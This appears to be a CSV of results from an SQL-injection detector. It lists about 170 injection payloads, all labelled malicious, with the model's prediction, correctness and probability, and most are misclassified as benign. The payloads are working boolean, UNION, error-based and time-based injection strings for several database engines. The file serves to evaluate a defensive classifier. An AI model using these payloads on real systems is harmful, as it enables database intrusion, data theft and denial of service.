Query,Label,predicted,correct,malicious_probability
1'||  (  select 'omeg' from dual where 4751  =  4751,1,0,False,0.3328749609773351
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",1,0,False,0.24122878225595876
"-2314%'   )    )    union all select 4612,4612--",1,0,False,0.2380180652974749
1%' and 7533  =  7533 and '%'  =  ',1,0,False,0.24207845718105533
"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",1,0,False,0.08900914999388751
"1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,False,0.3785282067982873
"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,True,0.7056021032143882
"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",1,0,False,0.1980314060105142
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1,0,False,0.11233140705184598
"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",1,0,False,0.026839621063692656
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1,0,False,0.2964695756386485
"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.510902903331121
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1,0,False,0.20992891242460973
"1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,False,0.31853471348098217
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,0,False,0.378336132840381
"-5891 union all select 7103,7103,7103,7103--",1,0,False,0.11874616880124572
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb",1,0,False,0.15311061125414824
"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.7915460460922786
1'   )    )    as mbzk where 9153  =  9153 and 2006  =  2006,1,0,False,0.10271833765866513
"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,False,0.456166211218568
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',1,0,False,0.050170039323614135
1'||  (  select 'gved' from dual where 6965  =  6965,1,0,False,0.3575042253408137
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--,1,0,False,0.09493811288862632
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'scye' like 'scye",1,1,True,0.7029242830624344
"1""   )    )    as kmss where 3214  =  3214 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,False,0.4472654182895895
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop",1,0,False,0.12428626979240547
"1'+  (  select afst where 7454  =  7454 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1,0,False,0.2548092236472933
"1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,0,False,0.28273388764966584
"1 where 5929  =  5929 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,False,0.38969301156924613
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1,0,False,0.06321592645201517
"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",1,0,False,0.15974029702502326
"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",1,1,True,0.5485002749366601
"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",1,0,False,0.20852275791175792
"-4588"" union all select 4550,4550,4550,4550#",1,0,False,0.047173510521693725
"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",1,0,False,0.20397117560372005
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,True,0.646994639837225
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,True,0.5223737131876399
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1,0,False,0.08464895081241458
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",1,0,False,0.145938305148952
1'  )   where 6244  =  6244 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,1,True,0.7115580478193022
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""imlq"" like ""imlq",1,1,True,0.5026020058486245
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,1,1,True,0.8929030705712889
1%'   )    )    or sleep  (  5  )  #,1,1,True,0.8381967840688261
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi",1,0,False,0.09816880982482816
"1%'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  '",1,0,False,0.2895518763944733
"1%""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""%""  =  """,1,0,False,0.07388635655302524
-1765'  )   order by 1--,1,1,True,0.8412721746597992
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,1,0,False,0.2542621367260957
"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.662233314643713
"1  )   where 1443  =  1443 union all select null,null,null,null,null#",1,0,False,0.13439936050493606
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,True,0.9350647650337625
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,1,0,False,0.34610959193358104
-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,1,0,False,0.07904053482559456
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0,False,0.46002872067004347
"select sleep  (  5  )   and ""%""  =  """,1,1,True,0.5236067334902352
1'+  (  select qdon where 9453  =  9453,1,0,False,0.05034566058100295
"-7884"" where 3297  =  3297 or 2492  =  6158",1,0,False,0.007650990570102009
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0,False,0.10440024848040334
"-5700 where 4238  =  4238 union all select 4238,4238,4238#",1,0,False,0.05159293913807232
"1'+  (  select 'zirh' where 9054  =  9054 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",1,0,False,0.23782599176116528
"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1,0,False,0.4908350648814767
"1   )    )     )   union all select null,null,null,null,null--",1,0,False,0.4814413392009653
"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",1,0,False,0.12856217513638252
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1,0,False,0.09798758202222559
select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,1,0,False,0.3365694904494175
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,1,1,True,0.9733248930066676
"-8902 union all select 4339,4339,4339#",1,0,False,0.03360440136962208
"elt  (  5953  =  5953,1  )  ",1,0,False,0.034379396136548494
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv",1,1,True,0.6617601496073016
-3431%'  )   or 9323  =  9323#,1,0,False,0.028725308911005196
"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",1,0,False,0.38954548501887565
1  )   as zzip where 5353  =  5353 and 3394  =  3092,1,0,False,0.03633900113544554
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--,1,0,False,0.034848997132956
"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1,0,False,0.04477925410608504
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,0,False,0.31059454755296606
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",1,1,True,0.6241245953520776
"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,0,False,0.03424194518311962
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki",1,1,True,0.5097115743605508
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,True,0.6980927259229419
1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,True,0.5480863781232422
"1%""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,1,0,False,0.35100044642329137
"1""   )    )    as brwj where 9180  =  9180",1,0,False,0.0334753543737855
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,0,False,0.4834207446601199
-7941 or   (  5822  =  8754  )  *8754-- eepn,1,0,False,0.10174410161513671
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""gydr"" like ""gydr",1,0,False,0.16177805727760047
"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,1,0,False,0.11703025642830245
1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',1,0,False,0.19959814555034713
-7758%'   )    )     )   or 3038  =  3038,1,0,False,0.028022218277212626
"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,False,0.3921917593501676
"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,False,0.08125180951705153
"-4305   )    )     )   union all select 2401,2401--",1,0,False,0.38114154761056834
-1277'   )    )     )   order by 1--,1,1,True,0.7981627462412806
"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",1,0,False,0.1263068010974298
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,1,0,False,0.31059349116688006
1 or sleep  (  5  )  # tdgb,1,1,True,0.9457447014437068
"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,0,False,0.4813060192889688
"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,1,0,False,0.25366118303124646
"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",1,0,False,0.38214713153825486
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,1,1,True,0.5561954455388916
1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,1,1,True,0.5406009313691964
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",1,0,False,0.16311007359096613
"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,0,False,0.4815986079992138
"-9440"" union all select 5599,5599,5599,5599,5599--",1,0,False,0.06864503974165528
"-5204""  )   union all select 7186,7186,7186--",1,0,False,0.08349723691817174
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",1,1,True,0.6077623012027015
"1'  )   as dvoy where 7906  =  7906 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.6592149960866088
"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,1,0,False,0.11117267925652809
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""weku"" like ""weku",1,0,False,0.32988046059868636
"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,0,False,0.12741284063438368
"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb",1,0,False,0.05273689592768164
"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",1,0,False,0.060975319014076525
-4557 or 6872  =  6872-- kkte,1,0,False,0.17221242836310616
 (  select   (  case when   (  6581  =  6581  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,0,False,0.3984376401386677
1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,1,0,False,0.4526038664070541
-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,1,0,False,0.07614357166770246
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,True,0.7629516970615111
"1""   )    )    as ufba where 4049  =  4049",1,0,False,0.062259968184057414
"1""  )   where 9447  =  9447",1,0,False,0.01738737650070104
"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,True,0.6137395328237635
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,0,False,0.09324874905577223
1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,1,1,True,0.7713121197737219
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf",1,0,False,0.41258569898455405
end and   (  'rlux' like 'rlux,1,1,True,0.5333508882489907
"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,0,False,0.1871751080296321
1'   )    )    as vwua where 8099  =  8099 union all select null--,1,0,False,0.48568717459186095
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,0,False,0.19575308701272126
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,False,0.041533526894174506
"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1,1,True,0.6887495438530448
"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1,0,False,0.34927655322973555
select sleep  (  5  )   and   (  'hhlq' like 'hhlq,1,1,True,0.7425824258318887
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",1,0,False,0.2588579888874334
"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1,0,False,0.41703572204690076
 (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7992  =  7992  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    ) ,1,0,False,0.10366373546689453
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,0,False,0.12726666804433903
"1""   )    )    as ljhz where 2416  =  2416",1,0,False,0.04088415130861433
1'+  (  select ohqr where 5610  =  5610,1,0,False,0.09031819350830544
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",1,1,True,0.5497583789160194
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",1,0,False,0.15048220946726573
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",1,0,False,0.48144208110120484
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",1,0,False,0.09627597234634591
1 where 4641  =  4641,1,0,False,0.036491060457642666
if  (  8537  =  7034  )   select 8537 else drop function vqmp--,1,0,False,0.05244160606905108
"1  )   as estm where 4809  =  4809 union all select null,null,null--",1,0,False,0.32582040922079236
"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,False,0.3357835455129247
 (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,1,0,False,0.09982297776122614
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko",1,1,True,0.714613432024114
"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.5705069958289801
-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--,1,1,True,0.562873094423976
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",1,0,False,0.040713658996100424
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt",1,1,True,0.7557437315261292
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,1,0,False,0.49453288320682287
1 where 6223  =  6223 rlike sleep  (  5  )  #,1,0,False,0.2447038392752459
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.5741439669373544
"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",1,0,False,0.07528690491580455
"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,1,0,False,0.07905446626663812
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,1,0,False,0.0574954375506432
"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",1,0,False,0.06291672998668633
"1%"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""%""  =  """,1,0,False,0.16870849333713447
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",1,0,False,0.09373458857588017
 (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,1,1,True,0.5329679432624064
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",1,0,False,0.14098638877022396
"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.7693929417099588
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",1,0,False,0.4747555528656393
-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,1,0,False,0.0791113796611075
"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",1,0,False,0.3930217169538334
"1""  )   where 1001  =  1001 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,False,0.4259966849829699
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'xwhi'  =  'xwhi",1,0,False,0.4250183283253884
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,1,1,True,0.8528692215185842
1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,1,1,True,0.7007034558933473
"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.5440060475187511
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",1,0,False,0.39685382946315173
1' in boolean mode  )   union all select null--,1,1,True,0.7687999713461708
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1,0,False,0.06178018607995232
"1""   )    )    as tgwp where 9405  =  9405",1,0,False,0.04140170719015423
1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,0,False,0.2237438924684982
1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,1,0,False,0.12292639827909178
"1""  )   as rovd where 3764  =  3764 and elt  (  4249  =  4249,7259  )  --",1,0,False,0.11103357772574247
select sleep  (  5  )   and   (  'dcys' like 'dcys,1,1,True,0.7121597538560301
1  )   as msat where 1267  =  1267,1,0,False,0.05978934811088075
